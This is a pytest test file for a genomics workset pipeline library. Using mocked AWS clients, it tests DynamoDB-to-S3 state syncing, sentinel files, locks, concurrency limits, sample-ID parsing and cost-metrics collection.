"""Tests for workset_integration.py - State bridge between DynamoDB and S3.

Tests the integration layer that synchronizes DynamoDB state management
with S3 sentinel-based processing system.
"""

import datetime as dt
import json
from unittest.mock import MagicMock, patch, call

import pytest

from daylib.workset_integration import (
    WorksetIntegration,
    SENTINEL_FILES,
    WORK_YAML_NAME,
    INFO_YAML_NAME,
)


@pytest.fixture
def mock_state_db():
    """Create mock WorksetStateDB."""
    mock_db = MagicMock()
    mock_db.register_workset.return_value = True
    mock_db.get_workset.return_value = {
        "workset_id": "test-ws-001",
        "state": "ready",
        "priority": "normal",
        "bucket": "test-bucket",
        "prefix": "worksets/test-ws-001/",
        "created_at": "2024-01-15T10:00:00Z",
        "updated_at": "2024-01-15T10:00:00Z",
    }
    mock_db.update_state.return_value = None
    mock_db.get_ready_worksets.return_value = []
    return mock_db


@pytest.fixture
def mock_s3_client():
    """Create mock S3 client."""
    mock_s3 = MagicMock()
    mock_s3.put_object.return_value = {}
    mock_s3.get_object.return_value = {
        "Body": MagicMock(read=lambda: b"2024-01-15T10:00:00Z")
    }
    mock_s3.delete_object.return_value = {}
    mock_s3.list_objects_v2.return_value = {"Contents": [], "KeyCount": 0}
    return mock_s3


@pytest.fixture
def mock_dynamodb():
    """Mock DynamoDB resource for WorksetStateDB tests."""
    with patch("daylib.workset_state_db.boto3.Session") as mock_session:
        mock_resource = MagicMock()
        mock_table = MagicMock()
        mock_client = MagicMock()

        mock_session.return_value.resource.return_value = mock_resource
        mock_session.return_value.client.return_value = mock_client
        mock_resource.Table.return_value = mock_table

        yield {
            "session": mock_session,
            "resource": mock_resource,
            "table": mock_table,
            "client": mock_client,
        }


@pytest.fixture
def integration(mock_state_db, mock_s3_client):
    """Create WorksetIntegration instance."""
    return WorksetIntegration(
        state_db=mock_state_db,
        s3_client=mock_s3_client,
        bucket="test-bucket",
        prefix="worksets/",
        region="us-west-2",
    )


class TestWorksetIntegrationInit:
    """Test WorksetIntegration initialization."""

    def test_init_with_provided_s3_client(self, mock_state_db, mock_s3_client):
        """Test initialization with provided S3 client."""
        integration = WorksetIntegration(
            state_db=mock_state_db,
            s3_client=mock_s3_client,
            bucket="my-bucket",
            prefix="data/worksets/",
        )
        assert integration._s3 is mock_s3_client
        assert integration.bucket == "my-bucket"
        assert integration.prefix == "data/worksets/"

    def test_init_creates_s3_client_if_not_provided(self, mock_state_db):
        """Test initialization creates RegionAwareS3Client if not provided."""
        with patch("daylib.workset_integration.RegionAwareS3Client") as mock_client_class:
            mock_client = MagicMock()
            mock_client_class.return_value = mock_client

            integration = WorksetIntegration(
                state_db=mock_state_db,
                bucket="my-bucket",
                region="us-east-1",
            )

            mock_client_class.assert_called_once_with(
                default_region="us-east-1",
                profile=None,
            )
            assert integration._s3 is mock_client

    def test_init_prefix_normalization(self, mock_state_db, mock_s3_client):
        """Test prefix is normalized with trailing slash."""
        integration = WorksetIntegration(
            state_db=mock_state_db,
            s3_client=mock_s3_client,
            bucket="bucket",
            prefix="worksets",  # No trailing slash
        )
        assert integration.prefix == "worksets/"


class TestRegisterWorkset:
    """Test workset registration."""

    def test_register_workset_dual_write(self, integration, mock_state_db, mock_s3_client):
        """Test registration writes to both DynamoDB and S3."""
        result = integration.register_workset(
            workset_id="new-ws-001",
            bucket="test-bucket",
            prefix="worksets/new-ws-001/",
            priority="high",
            metadata={"name": "Test Workset"},
            write_s3=True,
            write_dynamodb=True,
        )

        assert result is True
        mock_state_db.register_workset.assert_called_once()
        # S3 sentinel should be written
        assert mock_s3_client.put_object.called

    def test_register_workset_dynamodb_only(self, integration, mock_state_db, mock_s3_client):
        """Test registration to DynamoDB only."""
        result = integration.register_workset(
            workset_id="db-only-ws",
            bucket="test-bucket",
            prefix="worksets/db-only-ws/",
            write_s3=False,
            write_dynamodb=True,
        )

        assert result is True
        mock_state_db.register_workset.assert_called_once()

    def test_register_workset_s3_only(self, integration, mock_state_db, mock_s3_client):
        """Test registration to S3 only."""
        result = integration.register_workset(
            workset_id="s3-only-ws",
            bucket="test-bucket",
            prefix="worksets/s3-only-ws/",
            write_s3=True,
            write_dynamodb=False,
        )

        assert result is True
        mock_state_db.register_workset.assert_not_called()
        assert mock_s3_client.put_object.called


class TestWriteSentinel:
    """Test S3 sentinel writing."""

    def test_write_ready_sentinel(self, integration, mock_s3_client):
        """Test writing ready sentinel file."""
        timestamp = "2024-01-15T10:00:00Z"
        integration._write_sentinel(
            bucket="test-bucket",
            prefix="worksets/test/",
            state="ready",
            timestamp=timestamp,
        )

        mock_s3_client.put_object.assert_called_once()
        call_kwargs = mock_s3_client.put_object.call_args[1]
        assert call_kwargs["Bucket"] == "test-bucket"
        assert call_kwargs["Key"] == "worksets/test/daylily.ready"
        assert call_kwargs["Body"] == timestamp.encode()

    def test_write_in_progress_sentinel(self, integration, mock_s3_client):
        """Test writing in_progress sentinel file."""
        integration._write_sentinel(
            bucket="test-bucket",
            prefix="worksets/test/",
            state="in_progress",
            timestamp="2024-01-15T11:00:00Z",
        )

        call_kwargs = mock_s3_client.put_object.call_args[1]
        assert "daylily.in_progress" in call_kwargs["Key"]

    def test_write_complete_sentinel(self, integration, mock_s3_client):
        """Test writing complete sentinel file."""
        integration._write_sentinel(
            bucket="test-bucket",
            prefix="worksets/test/",
            state="complete",
            timestamp="2024-01-15T12:00:00Z",
        )

        call_kwargs = mock_s3_client.put_object.call_args[1]
        assert "daylily.complete" in call_kwargs["Key"]

    def test_write_error_sentinel(self, integration, mock_s3_client):
        """Test writing error sentinel file."""
        integration._write_sentinel(
            bucket="test-bucket",
            prefix="worksets/test/",
            state="error",
            timestamp="2024-01-15T12:00:00Z",
        )

        call_kwargs = mock_s3_client.put_object.call_args[1]
        assert "daylily.error" in call_kwargs["Key"]


class TestUpdateState:
    """Test state update synchronization."""

    def test_update_state_syncs_both(self, integration, mock_state_db, mock_s3_client):
        """Test state update syncs to both DynamoDB and S3."""
        integration.update_state(
            workset_id="test-ws-001",
            new_state="in_progress",
            reason="Started processing",
            write_s3=True,
            write_dynamodb=True,
        )

        mock_state_db.update_state.assert_called_once()
        # Should write new sentinel
        assert mock_s3_client.put_object.called

    def test_update_state_dynamodb_only(self, integration, mock_state_db, mock_s3_client):
        """Test state update to DynamoDB only."""
        mock_s3_client.reset_mock()

        integration.update_state(
            workset_id="test-ws-001",
            new_state="in_progress",
            reason="Processing started",
            write_s3=False,
            write_dynamodb=True,
        )

        mock_state_db.update_state.assert_called_once()

    def test_update_state_s3_only(self, integration, mock_state_db, mock_s3_client):
        """Test state update to S3 only."""
        mock_state_db.reset_mock()
        mock_s3_client.reset_mock()

        integration.update_state(
            workset_id="test-ws-001",
            new_state="complete",
            reason="Processing finished",
            write_s3=True,
            write_dynamodb=False,
        )

        mock_state_db.update_state.assert_not_called()
        assert mock_s3_client.put_object.called


class TestGetReadyWorksets:
    """Test getting ready worksets from DynamoDB."""

    def test_get_ready_worksets(self, integration, mock_state_db):
        """Test getting ready worksets from DynamoDB."""
        mock_state_db.get_ready_worksets_prioritized.return_value = [
            {
                "workset_id": "ws-001",
                "bucket": "test-bucket",
                "prefix": "worksets/ws-001/",
                "priority": "high",
            },
            {
                "workset_id": "ws-002",
                "bucket": "test-bucket",
                "prefix": "worksets/ws-002/",
                "priority": "normal",
            },
        ]

        worksets = integration.get_ready_worksets()

        assert len(worksets) == 2
        assert worksets[0]["workset_id"] == "ws-001"
        mock_state_db.get_ready_worksets_prioritized.assert_called_once()


class TestBuildWorkYaml:
    """Test work YAML generation from template."""

    def test_build_work_yaml_uses_template(self, integration):
        """Test that work YAML uses the template file structure."""
        metadata = {
            "samples": [{"sample_id": "S1", "fastq_r1": "s3://bucket/S1_R1.fq.gz"}],
            "reference_genome": "GRCh38",
        }

        # Returns string now, not dict
        work_yaml_content = integration._build_work_yaml("test-ws", metadata, "test-bucket", "worksets/test-ws/")

        # Should be a string (YAML content)
        assert isinstance(work_yaml_content, str)

        # Should contain template structure elements
        assert "day-clone:" in work_yaml_content
        assert "dy-r:" in work_yaml_content
        assert "export_uri:" in work_yaml_content

        # Should have {workdir_name} replaced with workset_id
        assert "test-ws" in work_yaml_content
        assert "{workdir_name}" not in work_yaml_content

    def test_build_work_yaml_with_export_uri(self, integration):
        """Test building work YAML with custom export URI."""
        metadata = {
            "samples": [{"sample_id": "S1", "fastq_r1": "s3://bucket/S1_R1.fq.gz"}],
            "reference_genome": "hg38",
            "export_uri": "s3://export-bucket/results/",
        }

        work_yaml_content = integration._build_work_yaml("test-ws", metadata, "test-bucket", "worksets/test-ws/")

        # Should contain the custom export_uri
        assert 's3://export-bucket/results/' in work_yaml_content

    def test_build_work_yaml_default_export_uri(self, integration):
        """Test that default export URI uses customer bucket."""
        metadata = {
            "samples": [{"sample_id": "S1", "fastq_r1": "s3://bucket/S1_R1.fq.gz"}],
            "reference_genome": "GRCh38",
        }

        work_yaml_content = integration._build_work_yaml("test-ws", metadata, "customer-bucket", "worksets/test-ws/")

        # Should contain the default export_uri with customer bucket
        assert 's3://customer-bucket/worksets/test-ws/results/' in work_yaml_content


class TestSyncDynamoDBToS3:
    """Test syncing DynamoDB worksets to S3."""

    def test_sync_dynamodb_to_s3(self, integration, mock_state_db, mock_s3_client):
        """Test syncing a single workset to S3."""
        # Return a dict with metadata as a dict, not a JSON string
        mock_state_db.get_workset.return_value = {
            "workset_id": "sync-ws",
            "state": "ready",
            "bucket": "test-bucket",
            "prefix": "worksets/sync-ws/",
            "metadata": {
                "samples": [{"sample_id": "S1", "fastq_r1": "s3://b/r1.fq.gz"}],
                "reference_genome": "GRCh38",
            },
        }

        result = integration.sync_dynamodb_to_s3("sync-ws")

        assert result is True
        # Should write work YAML and sentinel
        assert mock_s3_client.put_object.call_count >= 1


class TestAcquireReleaseLock:
    """Test lock acquisition and release."""

    def test_acquire_lock(self, integration, mock_state_db):
        """Test acquiring a lock."""
        mock_state_db.acquire_lock.return_value = True

        result = integration.acquire_lock("test-ws-001", "processor-1")

        assert result is True
        mock_state_db.acquire_lock.assert_called_once()

    def test_release_lock(self, integration, mock_state_db):
        """Test releasing a lock."""
        mock_state_db.release_lock.return_value = True

        result = integration.release_lock("test-ws-001", "processor-1")

        assert result is True
        mock_state_db.release_lock.assert_called_once()


class TestMonitorWorksetExistenceCheck:
    """Tests for monitor's workset existence check - monitor should NEVER create worksets."""

    @pytest.fixture
    def mock_state_db_for_monitor(self):
        """Create mock WorksetStateDB for monitor tests."""
        mock_db = MagicMock()
        return mock_db

    def test_workset_exists_returns_true_when_found(self, mock_state_db_for_monitor):
        """Test that _workset_exists_in_dynamodb returns True when workset exists."""
        from daylib.workset_monitor import WorksetMonitor

        mock_state_db_for_monitor.get_workset.return_value = {
            "workset_id": "test-ws-001",
            "state": "ready",
        }

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.state_db = mock_state_db_for_monitor

        result = monitor._workset_exists_in_dynamodb("test-ws-001")

        assert result is True
        mock_state_db_for_monitor.get_workset.assert_called_once_with("test-ws-001")

    def test_workset_exists_returns_false_when_not_found(self, mock_state_db_for_monitor):
        """Test that _workset_exists_in_dynamodb returns False when workset doesn't exist."""
        from daylib.workset_monitor import WorksetMonitor

        mock_state_db_for_monitor.get_workset.return_value = None

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.state_db = mock_state_db_for_monitor

        result = monitor._workset_exists_in_dynamodb("unknown-ws")

        assert result is False
        mock_state_db_for_monitor.get_workset.assert_called_once_with("unknown-ws")

    def test_workset_exists_returns_false_when_no_state_db(self):
        """Test that _workset_exists_in_dynamodb returns False when state_db is None."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.state_db = None

        result = monitor._workset_exists_in_dynamodb("test-ws-001")

        assert result is False

    def test_monitor_does_not_create_worksets(self, mock_state_db_for_monitor):
        """Test that monitor does NOT call register_workset for unknown worksets."""
        from daylib.workset_monitor import WorksetMonitor

        # Workset doesn't exist in DynamoDB
        mock_state_db_for_monitor.get_workset.return_value = None

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.state_db = mock_state_db_for_monitor

        # Check existence - should return False
        result = monitor._workset_exists_in_dynamodb("new-workset")

        assert result is False
        # Most importantly: register_workset should NOT be called
        mock_state_db_for_monitor.register_workset.assert_not_called()


class TestMonitorConcurrentProcessing:
    """Tests for monitor's concurrent workset processing."""

    def test_mark_workset_active_success(self):
        """Test marking a workset as active when slots available."""
        import threading
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor._active_worksets = set()
        monitor._active_worksets_lock = threading.Lock()
        monitor.config = MagicMock()
        monitor.config.monitor.max_concurrent_worksets = 3

        result = monitor._mark_workset_active("ws-001")

        assert result is True
        assert "ws-001" in monitor._active_worksets

    def test_mark_workset_active_at_capacity(self):
        """Test marking a workset as active when at capacity."""
        import threading
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor._active_worksets = {"ws-001", "ws-002", "ws-003"}
        monitor._active_worksets_lock = threading.Lock()
        monitor.config = MagicMock()
        monitor.config.monitor.max_concurrent_worksets = 3

        result = monitor._mark_workset_active("ws-004")

        assert result is False
        assert "ws-004" not in monitor._active_worksets

    def test_mark_workset_active_already_active(self):
        """Test marking a workset as active when already active."""
        import threading
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor._active_worksets = {"ws-001"}
        monitor._active_worksets_lock = threading.Lock()
        monitor.config = MagicMock()
        monitor.config.monitor.max_concurrent_worksets = 3

        result = monitor._mark_workset_active("ws-001")

        assert result is False

    def test_mark_workset_inactive(self):
        """Test marking a workset as inactive."""
        import threading
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor._active_worksets = {"ws-001", "ws-002"}
        monitor._active_worksets_lock = threading.Lock()
        monitor.config = MagicMock()
        monitor.config.monitor.max_concurrent_worksets = 3

        monitor._mark_workset_inactive("ws-001")

        assert "ws-001" not in monitor._active_worksets
        assert "ws-002" in monitor._active_worksets

    def test_get_active_count(self):
        """Test getting the count of active worksets."""
        import threading
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor._active_worksets = {"ws-001", "ws-002"}
        monitor._active_worksets_lock = threading.Lock()

        assert monitor._get_active_count() == 2

    def test_is_workset_active(self):
        """Test checking if a workset is active."""
        import threading
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor._active_worksets = {"ws-001"}
        monitor._active_worksets_lock = threading.Lock()

        assert monitor._is_workset_active("ws-001") is True
        assert monitor._is_workset_active("ws-002") is False

    def test_should_skip_workset_complete(self):
        """Test that completed worksets are skipped."""
        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.attempt_restart = False

        workset = MagicMock()
        workset.sentinels = {SENTINEL_FILES["complete"]: "2024-01-01"}

        assert monitor._should_skip_workset(workset) is True

    def test_should_skip_workset_error_no_restart(self):
        """Test that errored worksets are skipped when restart not enabled."""
        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.attempt_restart = False

        workset = MagicMock()
        workset.sentinels = {SENTINEL_FILES["error"]: "error message"}

        assert monitor._should_skip_workset(workset) is True

    def test_should_skip_workset_error_with_restart(self):
        """Test that errored worksets are NOT skipped when restart enabled."""
        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.attempt_restart = True

        workset = MagicMock()
        workset.sentinels = {SENTINEL_FILES["error"]: "error message"}

        assert monitor._should_skip_workset(workset) is False

    def test_should_skip_workset_ignored(self):
        """Test that ignored worksets are skipped."""
        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.attempt_restart = False

        workset = MagicMock()
        workset.sentinels = {SENTINEL_FILES["ignore"]: "ignored"}

        assert monitor._should_skip_workset(workset) is True

    def test_should_not_skip_ready_workset(self):
        """Test that ready worksets are NOT skipped."""
        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.attempt_restart = False

        workset = MagicMock()
        workset.sentinels = {SENTINEL_FILES["ready"]: "ready"}

        assert monitor._should_skip_workset(workset) is False


class TestFormatBytes:
    """Tests for the _format_bytes helper method."""

    def test_format_bytes_bytes(self):
        """Test formatting small byte values."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        assert monitor._format_bytes(0) == "0B"
        assert monitor._format_bytes(512) == "512B"
        assert monitor._format_bytes(1023) == "1023B"

    def test_format_bytes_kilobytes(self):
        """Test formatting kilobyte values."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        assert monitor._format_bytes(1024) == "1.0K"
        assert monitor._format_bytes(2048) == "2.0K"
        # Note: uses integer division so 1536 -> 1K
        assert monitor._format_bytes(1536) == "1.0K"

    def test_format_bytes_megabytes(self):
        """Test formatting megabyte values."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        assert monitor._format_bytes(1024 * 1024) == "1.0M"
        assert monitor._format_bytes(256 * 1024 * 1024) == "256.0M"

    def test_format_bytes_gigabytes(self):
        """Test formatting gigabyte values."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        assert monitor._format_bytes(1024 * 1024 * 1024) == "1.0G"
        assert monitor._format_bytes(13 * 1024 * 1024 * 1024) == "13.0G"

    def test_format_bytes_terabytes(self):
        """Test formatting terabyte values."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        assert monitor._format_bytes(1024 * 1024 * 1024 * 1024) == "1.0T"


class TestExtractSampleIdFromPath:
    """Tests for the _extract_sample_id_from_path helper method."""

    def test_extract_sample_id_cram(self):
        """Test extracting sample ID from CRAM file path."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)

        path = "/fsx/analysis/results/day/hg38/RUN001_SAMPLE123_EXP001-L001-BARCODE-libprep-vendor-seq-platform.cram"
        assert monitor._extract_sample_id_from_path(path) == "SAMPLE123"

    def test_extract_sample_id_snv_vcf(self):
        """Test extracting sample ID from SNV VCF file path."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)

        path = "/fsx/analysis/results/day/hg38/RUN001_SAMPLE456_EXP002.snv.sort.vcf.gz"
        assert monitor._extract_sample_id_from_path(path) == "SAMPLE456"

    def test_extract_sample_id_sv_vcf(self):
        """Test extracting sample ID from SV VCF file path."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)

        path = "/fsx/analysis/results/day/hg38/RUN001_SAMPLE789_EXP003.sv.sort.vcf.gz"
        assert monitor._extract_sample_id_from_path(path) == "SAMPLE789"

    def test_extract_sample_id_invalid_format(self):
        """Test extracting sample ID from invalid format returns None."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)

        # Single part filename
        path = "/fsx/analysis/results/day/hg38/singlename.cram"
        assert monitor._extract_sample_id_from_path(path) is None

    def test_extract_sample_id_simple_format(self):
        """Test extracting sample ID from simple two-part format."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)

        path = "/fsx/analysis/RUNID_SAMPLEID.cram"
        assert monitor._extract_sample_id_from_path(path) == "SAMPLEID"


class TestCollectPostExportMetrics:
    """Tests for post-export metrics collection from S3."""

    @pytest.fixture
    def mock_monitor(self):
        """Create a mock monitor with required attributes."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.state_db = MagicMock()
        monitor.dry_run = False
        monitor.debug = False
        monitor._s3 = MagicMock()  # Use _s3 (RegionAwareS3Client attribute)
        monitor.config = MagicMock()
        monitor.config.aws.region = "us-east-1"
        monitor.config.aws.profile = None
        return monitor

    def test_collect_directory_size_from_s3(self, mock_monitor):
        """Test collecting total directory size from S3."""
        workset = MagicMock()
        workset.name = "test-ws-001"

        # Mock S3 paginator response with files totaling ~14GB
        mock_paginator = MagicMock()
        mock_monitor._s3.get_paginator.return_value = mock_paginator
        mock_paginator.paginate.return_value = [
            {
                "Contents": [
                    {"Key": "prefix/workset/file1.cram", "Size": 5368709120},
                    {"Key": "prefix/workset/file2.cram", "Size": 5368709120},
                    {"Key": "prefix/workset/file3.vcf.gz", "Size": 3221225472},
                ]
            }
        ]

        mock_monitor._update_progress_step = MagicMock()
        mock_monitor.state_db.update_performance_metrics = MagicMock(return_value=True)

        # Mock PipelineStatusFetcher
        with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
            mock_fetcher = MagicMock()
            mock_fetcher_class.return_value = mock_fetcher
            mock_fetcher.fetch_performance_metrics_from_s3.return_value = {
                "alignment_stats": None,
                "benchmark_data": None,
                "cost_summary": None,
            }

            result = mock_monitor._collect_post_export_metrics(
                workset, "s3://test-bucket/prefix/workset"
            )

        assert result is not None
        assert result["analysis_directory_size_bytes"] == 13958643712
        assert result["analysis_directory_size_human"] == "13.0G"

    def test_collect_file_metrics_cram_from_s3(self, mock_monitor):
        """Test collecting CRAM file metrics from S3."""
        workset = MagicMock()
        workset.name = "test-ws-002"

        # Mock S3 paginator response with CRAM files
        mock_paginator = MagicMock()
        mock_monitor._s3.get_paginator.return_value = mock_paginator
        mock_paginator.paginate.return_value = [
            {
                "Contents": [
                    {"Key": "prefix/workset/results/day/hg38/RUN001_SAMPLE1_EXP001.cram", "Size": 5368709120},
                    {"Key": "prefix/workset/results/day/hg38/RUN001_SAMPLE2_EXP002.cram", "Size": 4294967296},
                ]
            }
        ]

        mock_monitor._update_progress_step = MagicMock()
        mock_monitor.state_db.update_performance_metrics = MagicMock(return_value=True)

        # Mock PipelineStatusFetcher
        with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
            mock_fetcher = MagicMock()
            mock_fetcher_class.return_value = mock_fetcher
            mock_fetcher.fetch_performance_metrics_from_s3.return_value = {
                "alignment_stats": None,
                "benchmark_data": None,
                "cost_summary": None,
            }

            result = mock_monitor._collect_post_export_metrics(
                workset, "s3://test-bucket/prefix/workset"
            )

        assert result is not None
        assert "per_sample_metrics" in result
        assert "SAMPLE1" in result["per_sample_metrics"]
        assert result["per_sample_metrics"]["SAMPLE1"]["cram_count"] == 1
        assert result["per_sample_metrics"]["SAMPLE1"]["cram_size_bytes"] == 5368709120
        assert "SAMPLE2" in result["per_sample_metrics"]
        assert result["per_sample_metrics"]["SAMPLE2"]["cram_count"] == 1
        assert result["per_sample_metrics"]["SAMPLE2"]["cram_size_bytes"] == 4294967296

    def test_collect_metrics_no_s3_uri(self, mock_monitor):
        """Test that metrics collection gracefully handles missing S3 URI."""
        workset = MagicMock()
        workset.name = "test-ws-003"

        mock_monitor._update_progress_step = MagicMock()

        # Should return None when no S3 URI provided
        result = mock_monitor._collect_post_export_metrics(workset, None)

        assert result is None

    def test_collect_metrics_invalid_s3_uri(self, mock_monitor):
        """Test that metrics collection handles invalid S3 URI."""
        workset = MagicMock()
        workset.name = "test-ws-004"

        mock_monitor._update_progress_step = MagicMock()

        # Should return None for invalid S3 URI
        result = mock_monitor._collect_post_export_metrics(workset, "not-an-s3-uri")

        assert result is None


class TestParseBenchmarkCosts:
    """Tests for benchmark cost parsing."""

    @pytest.fixture
    def mock_monitor(self):
        """Create a mock monitor for benchmark tests."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        return monitor

    def test_parse_benchmark_costs_success(self, mock_monitor):
        """Test parsing benchmark TSV with task_cost column."""
        import subprocess

        workset = MagicMock()
        workset.name = "test-ws-001"

        benchmark_content = (
            b"rule\tsample\ttask_cost\truntime\n"
            b"align\tSAMPLE1\t0.1234\t100\n"
            b"variant_call\tSAMPLE1\t0.5678\t200\n"
            b"align\tSAMPLE2\t0.2345\t150\n"
            b"variant_call\tSAMPLE2\t0.4321\t180\n"
        )

        cat_result = subprocess.CompletedProcess(
            args=[], returncode=0, stdout=benchmark_content, stderr=b""
        )

        mock_monitor._run_headnode_command = MagicMock(return_value=cat_result)

        per_sample_metrics = {}
        result = mock_monitor._parse_benchmark_costs(
            workset,
            "test-cluster",
            "/fsx/analysis/results/day/hg38/other_reports/rules_benchmark_data_mqc.tsv",
            per_sample_metrics,
        )

        assert result is not None
        expected_total = 0.1234 + 0.5678 + 0.2345 + 0.4321
        assert abs(result["total_cost"] - expected_total) < 0.0001
        assert "SAMPLE1" in result["sample_costs"]
        assert abs(result["sample_costs"]["SAMPLE1"] - (0.1234 + 0.5678)) < 0.0001
        assert "SAMPLE2" in result["sample_costs"]
        assert abs(result["sample_costs"]["SAMPLE2"] - (0.2345 + 0.4321)) < 0.0001

        # Check per_sample_metrics was updated
        assert "SAMPLE1" in per_sample_metrics
        assert "compute_cost_usd" in per_sample_metrics["SAMPLE1"]

    def test_parse_benchmark_costs_file_not_found(self, mock_monitor):
        """Test handling when benchmark file doesn't exist."""
        import subprocess

        workset = MagicMock()
        workset.name = "test-ws-002"

        cat_result = subprocess.CompletedProcess(
            args=[], returncode=1, stdout=b"", stderr=b"No such file"
        )

        mock_monitor._run_headnode_command = MagicMock(return_value=cat_result)

        result = mock_monitor._parse_benchmark_costs(
            workset, "test-cluster", "/nonexistent/path.tsv", {}
        )

        assert result is None

    def test_parse_benchmark_costs_no_task_cost_column(self, mock_monitor):
        """Test handling when task_cost column is missing."""
        import subprocess

        workset = MagicMock()
        workset.name = "test-ws-003"

        benchmark_content = (
            b"rule\tsample\truntime\n"
            b"align\tSAMPLE1\t100\n"
        )

        cat_result = subprocess.CompletedProcess(
            args=[], returncode=0, stdout=benchmark_content, stderr=b""
        )

        mock_monitor._run_headnode_command = MagicMock(return_value=cat_result)

        result = mock_monitor._parse_benchmark_costs(
            workset, "test-cluster", "/fsx/path.tsv", {}
        )

        assert result is None


class TestHeadnodeAnalysisPath:
    """Tests for headnode_analysis_path storage in DynamoDB."""

    def test_record_pipeline_location_stores_path(self):
        """Test that _record_pipeline_location stores headnode_analysis_path in DynamoDB."""
        from daylib.workset_monitor import WorksetMonitor
        from pathlib import Path, PurePosixPath
        import tempfile

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.state_db = MagicMock()
        monitor._pipeline_locations = {}
        monitor._workset_metrics = {}

        workset = MagicMock()
        workset.name = "test-ws-path-001"

        # Use temp directory for local state
        with tempfile.TemporaryDirectory() as tmpdir:
            state_dir = Path(tmpdir)
            monitor._local_state_dir = MagicMock(return_value=state_dir)
            monitor._save_metrics = MagicMock()

            location = PurePosixPath("/fsx/analysis_results/ubuntu/test-ws-path-001/daylily-omics-analysis")
            monitor._record_pipeline_location(workset, location)

            # Verify DynamoDB was called with headnode_analysis_path
            monitor.state_db.update_execution_environment.assert_called_once_with(
                "test-ws-path-001",
                headnode_analysis_path="/fsx/analysis_results/ubuntu/test-ws-path-001/daylily-omics-analysis",
            )

    def test_record_pipeline_location_handles_db_failure(self):
        """Test that _record_pipeline_location continues on DynamoDB failure."""
        from daylib.workset_monitor import WorksetMonitor
        from pathlib import Path, PurePosixPath
        import tempfile

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.state_db = MagicMock()
        monitor.state_db.update_execution_environment.side_effect = Exception("DB error")
        monitor._pipeline_locations = {}
        monitor._workset_metrics = {}

        workset = MagicMock()
        workset.name = "test-ws-path-002"

        with tempfile.TemporaryDirectory() as tmpdir:
            state_dir = Path(tmpdir)
            monitor._local_state_dir = MagicMock(return_value=state_dir)
            monitor._save_metrics = MagicMock()

            location = PurePosixPath("/fsx/analysis")
            # Should not raise exception
            monitor._record_pipeline_location(workset, location)

            # Local state should still be recorded
            assert workset.name in monitor._pipeline_locations


class TestProgressStepsMetrics:
    """Tests for metrics-related progress steps."""

    def test_progress_step_collecting_metrics_exists(self):
        """Test that COLLECTING_METRICS progress step exists."""
        from daylib.workset_state_db import WorksetProgressStep

        assert hasattr(WorksetProgressStep, "COLLECTING_METRICS")
        assert WorksetProgressStep.COLLECTING_METRICS.value == "collecting_metrics"

    def test_progress_step_metrics_complete_exists(self):
        """Test that METRICS_COMPLETE progress step exists."""
        from daylib.workset_state_db import WorksetProgressStep

        assert hasattr(WorksetProgressStep, "METRICS_COMPLETE")
        assert WorksetProgressStep.METRICS_COMPLETE.value == "metrics_complete"

    def test_progress_step_metrics_failed_exists(self):
        """Test that METRICS_FAILED progress step exists."""
        from daylib.workset_state_db import WorksetProgressStep

        assert hasattr(WorksetProgressStep, "METRICS_FAILED")
        assert WorksetProgressStep.METRICS_FAILED.value == "metrics_failed"


class TestUpdateExecutionEnvironmentHeadnodePath:
    """Tests for headnode_analysis_path in update_execution_environment."""

    def test_update_with_headnode_analysis_path(self, mock_dynamodb):
        """Test that headnode_analysis_path is stored in DynamoDB."""
        from daylib.workset_state_db import WorksetStateDB

        db = WorksetStateDB(
            table_name="test-worksets",
            region="us-west-2",
            profile=None,
        )

        mock_table = mock_dynamodb["table"]
        mock_table.update_item.return_value = {}

        db.update_execution_environment(
            workset_id="test-ws-001",
            headnode_analysis_path="/fsx/analysis_results/ubuntu/test-ws-001/daylily-omics-analysis",
        )

